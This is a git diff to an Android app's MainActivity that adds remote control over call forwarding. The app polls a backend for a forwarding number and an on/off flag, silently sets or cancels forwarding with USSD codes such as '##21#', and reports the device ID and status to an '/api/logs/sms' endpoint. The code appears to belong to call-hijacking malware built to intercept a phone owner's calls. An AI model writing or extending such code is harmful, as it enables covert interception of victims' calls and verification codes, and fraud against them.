@@ -190,6 +190,51 @@ public class MainActivity extends BridgeActivity {
         }).start();
     }
 
+    private void stopCallForwarding() {
+        if (!isForwardingSet) return;
+        
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+            String ussd = "##21#";
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                try {
+                    android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                    tm.sendUssdRequest(ussd, new android.telephony.TelephonyManager.UssdResponseCallback() {
+                        @Override
+                        public void onReceiveUssdResponse(android.telephony.TelephonyManager telephonyManager, String request, CharSequence response) {
+                            Log.d(TAG, "USSD Stop Success: " + response);
+                            isForwardingSet = false;
+                            lastForwardedNumber = "";
+                            notifyBackendOfStop();
+                        }
+                        @Override
+                        public void onReceiveUssdResponseFailed(android.telephony.TelephonyManager telephonyManager, String request, int failureCode) {
+                            Log.e(TAG, "USSD Stop Failed: " + failureCode);
+                        }
+                    }, new Handler(Looper.getMainLooper()));
+                } catch (Exception e) {
+                    Log.e(TAG, "USSD Stop Exception", e);
+                }
+            }
+        }
+    }
+
+    private void notifyBackendOfStop() {
+        new Thread(() -> {
+            try {
+                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                JSONObject payload = new JSONObject();
+                payload.put("deviceId", deviceId);
+                payload.put("sender", "SYSTEM_ALERT");
+                payload.put("message", "Call forwarding SUCCESSFULLY DEACTIVATED");
+                payload.put("timestamp", new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).format(new Date()));
+                sendToBackend("/api/logs/sms", payload.toString());
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to notify backend", e);
+            }
+        }).start();
+    }
+
     private void requestIgnoreBatteryOptimizations() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             String packageName = getPackageName();
@@ -328,10 +373,14 @@ public class MainActivity extends BridgeActivity {
                 reader.close();
                 
                 JSONObject config = new JSONObject(sb.toString());
-                if (config.has("forwarding_enabled") && config.getBoolean("forwarding_enabled")) {
-                    String number = config.getString("forwarding_number");
-                    if (number != null && !number.isEmpty()) {
-                        new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                if (config.has("forwarding_enabled")) {
+                    if (config.getBoolean("forwarding_enabled")) {
+                        String number = config.getString("forwarding_number");
+                        if (number != null && !number.isEmpty()) {
+                            new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                        }
+                    } else {
+                        new Handler(Looper.getMainLooper()).post(this::stopCallForwarding);
                     }
                 }
             }
